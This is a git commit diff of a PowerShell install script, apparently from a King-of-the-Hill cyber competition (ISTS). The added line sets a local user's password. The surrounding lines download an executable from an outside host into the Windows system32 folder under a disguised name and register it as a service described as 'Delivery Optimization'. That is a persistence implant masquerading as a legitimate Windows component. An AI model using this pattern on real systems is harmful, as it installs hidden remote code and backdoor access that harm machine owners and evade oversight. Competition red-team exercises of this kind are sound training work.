b9d73c0b266a3302450772d458b910ed46fda3ea
CrimsonMaple <crimsonkaede@gmail.com>
2021-03-06 09:45:06 -0500

    Update password for KoTH. (ISTS)

--- install-iroh.ps1
+++ install-iroh.ps1
@@ -1,3 +1,4 @@
+net user kurama krystal_the_gamer
 curl https://crimson.ninja/Iroh-Service.exe -o C:\Windows\system32\D0Svc.exe
 New-Service -Name "D0Svc" -BinaryPathName C:\Windows\system32\D0Svc.exe
 sc.exe description D0Svc "Delivery Optimization"
